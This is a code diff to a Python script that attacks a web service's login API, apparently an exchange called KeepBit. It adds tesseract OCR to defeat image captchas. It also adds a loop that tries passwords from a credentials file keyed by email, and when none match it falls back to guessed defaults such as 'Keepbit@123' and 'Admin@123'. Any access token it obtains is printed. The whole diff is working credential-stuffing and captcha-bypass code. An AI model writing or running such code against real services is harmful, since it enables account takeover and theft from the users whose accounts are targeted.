@@ -112,27 +112,69 @@ def pause():
 
 
 def ocr_answers(img_bytes):
-    """Return list of candidate answers from ddddocr (raw + preprocessed)."""
+    """Candidate answers: ddddocr (raw+preproc) then tesseract (psm 7/8/13, upscaled)."""
+    import re as _re
+    answers = []
+    # --- ddddocr ---
     try:
         import ddddocr
         from PIL import Image, ImageOps
+        ocr = ddddocr.DdddOcr(show_ad=False)
+        try:
+            answers.append(("dd_raw", ocr.classification(img_bytes)))
+        except Exception as e:
+            print("[!] ocr raw err %s" % e, flush=True)
+        try:
+            img = Image.open(io_bytes(img_bytes)).convert("L")
+            img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
+            img = ImageOps.autocontrast(img)
+            answers.append(("dd_gray3x", ocr.classification(io_bytes2(img))))
+        except Exception as e:
+            print("[!] ocr preproc err %s" % e, flush=True)
     except Exception as e:
-        print("[!] ocr deps missing: %s" % e, flush=True)
-        return []
-    out = []
-    ocr = ddddocr.DdddOcr(show_ad=False)
+        print("[!] ddddocr missing: %s" % e, flush=True)
+    # --- tesseract fallback ---
     try:
-        out.append(("raw", ocr.classification(img_bytes)))
-    except Exception as e:
-        print("[!] ocr raw err %s" % e, flush=True)
-    try:
+        import subprocess, tempfile, os
+        from PIL import Image, ImageOps
         img = Image.open(io_bytes(img_bytes)).convert("L")
-        img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
-        img = ImageOps.autocontrast(img)
-        buf = io_bytes2(img)
-        out.append(("gray3x", ocr.classification(buf)))
+        variants = []
+        variants.append(("tess_raw", img))
+        up = img.resize((img.width * 4, img.height * 4), Image.LANCZOS)
+        up = ImageOps.autocontrast(up)
+        variants.append(("tess_up", up))
+        variants.append(("tess_bw", up.point(lambda p: 255 if p > 140 else 0)))
+        for name, im in variants:
+            tf = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
+            im.save(tf.name)
+            tfname = tf.name
+            tf.close()
+            for psm in ("7", "8", "13"):
+                try:
+                    out = subprocess.run(
+                        ["tesseract", tfname, "stdout", "--psm", psm,
+                         "-c", "tessedit_char_whitelist="
+                         "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"],
+                        capture_output=True, timeout=30)
+                    t = _re.sub(r"\s+", "", out.stdout.decode("utf-8", "ignore").strip())
+                    if t:
+                        answers.append(("%s_psm%s" % (name, psm), t))
+                except Exception as e:
+                    print("[!] tess %s psm%s err %s" % (name, psm, e), flush=True)
+            try:
+                os.unlink(tfname)
+            except Exception:
+                pass
     except Exception as e:
-        print("[!] ocr preproc err %s" % e, flush=True)
+        print("[!] tesseract missing: %s" % e, flush=True)
+    # dedupe preserving order
+    seen = set()
+    out = []
+    for name, a in answers:
+        a2 = _re.sub(r"[^A-Za-z0-9]", "", a)
+        if a2 and a2 not in seen:
+            seen.add(a2)
+            out.append((name, a2))
     return out
 
 
@@ -201,55 +243,66 @@ def main():
         r2 = c.post_enc("/api/Register/CheckCaptchaCode", {"email": em, "code": code, "type": "2"})
         print("FULL CheckCaptchaCode -> %s" % json.dumps(r2, ensure_ascii=False)[:200], flush=True)
         pause()
-        # try up to 3 captcha solve attempts
-        attempts = 0
-        while attempts < 3:
-            attempts += 1
-            r3, img_b64, key = fetch_captcha(c)
-            print("FULL captcha#%d key=%s imglen=%d" % (attempts, key, len(img_b64)), flush=True)
-            ans = ""
-            if img_b64:
-                raw = base64.b64decode(img_b64)
-                open("/tmp/cap%d.png" % attempts, "wb").write(raw)
-                for name, a in ocr_answers(raw):
-                    print("FULL OCR#%d %s -> %r" % (attempts, name, a), flush=True)
-                    if a and re_full_code(a):
-                        ans = a
-                        break
-            pwd = "Aa123456."
-            payload = {"appID": APPID, "pwd": base64.b64encode(pwd.encode()).decode(),
-                       "email": em, "isAdmin": ISADMIN, "language": "en",
-                       "verificationCode": ans, "verificationKey": key}
-            r4 = c.post_enc("/api/Login/Login", payload)
-            rc = r4.get("ErrCode")
-            rd = r4.get("ResData")
-            tok = ""
-            if isinstance(rd, dict):
-                tok = rd.get("AccessToken") or rd.get("accessToken") or ""
-            print("FULL LOGIN#%d cap=%r -> ErrCode=%s ErrMsg=%s token=%s" % (
-                attempts, ans, rc, r4.get("ErrMsg"), (tok[:60] + "...") if tok else ""), flush=True)
+        # pwd candidates: email-matched lines from KBP_CREDS, else fallback family
+        pwds = []
+        try:
+            for line in open("/tmp/kbp_creds.txt"):
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if "|" in line:
+                    e, p = line.split("|", 1)
+                    if e.lower() == em.lower():
+                        pwds.append(p)
+        except Exception as ex:
+            print("[!] creds file unavailable: %s" % ex, flush=True)
+        if not pwds:
+            pwds = ["Aa123456.", "666666", "123456", "k4806008",
+                    "Admin@123", "Keepbit@123", "Qqlink@123"]
+        pwds = pwds[:3]
+        print("[*] FULL pwd candidates: %d" % len(pwds), flush=True)
+        for pi, pwd in enumerate(pwds):
+            cap_tries = 0
+            while cap_tries < 2:
+                cap_tries += 1
+                r3, img_b64, key = fetch_captcha(c)
+                print("FULL pwd#%d captcha#%d key=%s imglen=%d" % (
+                    pi, cap_tries, key, len(img_b64)), flush=True)
+                ans = ""
+                if img_b64:
+                    raw = base64.b64decode(img_b64)
+                    open("/tmp/cap%d.png" % (pi * 2 + cap_tries), "wb").write(raw)
+                    for name, a in ocr_answers(raw):
+                        print("FULL OCR#%d-%d %s -> %r" % (pi, cap_tries, name, a), flush=True)
+                        if a and re_full_code(a):
+                            ans = a
+                            break
+                payload = {"appID": APPID, "pwd": base64.b64encode(pwd.encode()).decode(),
+                           "email": em, "isAdmin": ISADMIN, "language": "en",
+                           "verificationCode": ans, "verificationKey": key}
+                r4 = c.post_enc("/api/Login/Login", payload)
+                rc = r4.get("ErrCode")
+                rd = r4.get("ResData")
+                tok = ""
+                if isinstance(rd, dict):
+                    tok = rd.get("AccessToken") or rd.get("accessToken") or ""
+                print("FULL LOGIN#%d pwd=%r cap=%r -> ErrCode=%s ErrMsg=%s token=%s" % (
+                    pi, pwd, ans, rc, r4.get("ErrMsg"), (tok[:60] + "...") if tok else ""), flush=True)
+                if tok:
+                    print("TOKEN %s" % tok, flush=True)
+                    break
+                if rc == "200" or (isinstance(rc, int) and rc == 200):
+                    print("FULL LOGIN#%d Success=true" % pi, flush=True)
+                    break
+                if "4042" in str(rc):
+                    # captcha wrong/expired - retry with fresh captcha once
+                    pause()
+                    continue
+                # password-level or other error: move to next pwd
+                break
             if tok:
-                print("TOKEN %s" % tok, flush=True)
-                break
-            if rc == "200" or (isinstance(rc, int) and rc == 200):
-                print("FULL LOGIN#%d Success=true" % attempts, flush=True)
-                break
-            if "4042" not in str(rc):
-                # not a captcha error - no point retrying captcha
                 break
             pause()
-        else:
-            # fallback variant B: email code in verificationCode field
-            print("FULL fallback B: email code in verificationCode", flush=True)
-            r5 = c.post_enc("/api/Login/Login", {
-                "appID": APPID, "pwd": base64.b64encode(b"Aa123456.").decode(),
-                "email": em, "isAdmin": ISADMIN, "language": "en",
-                "verificationCode": code, "verificationKey": ""})
-            print("FULL LOGIN-B -> ErrCode=%s ErrMsg=%s Success=%s" % (
-                r5.get("ErrCode"), r5.get("ErrMsg"), r5.get("Success")), flush=True)
-            rd5 = r5.get("ResData")
-            if isinstance(rd5, dict) and (rd5.get("AccessToken") or rd5.get("accessToken")):
-                print("TOKEN %s" % (rd5.get("AccessToken") or rd5.get("accessToken")), flush=True)
         print("[*] done", flush=True)
         return
 
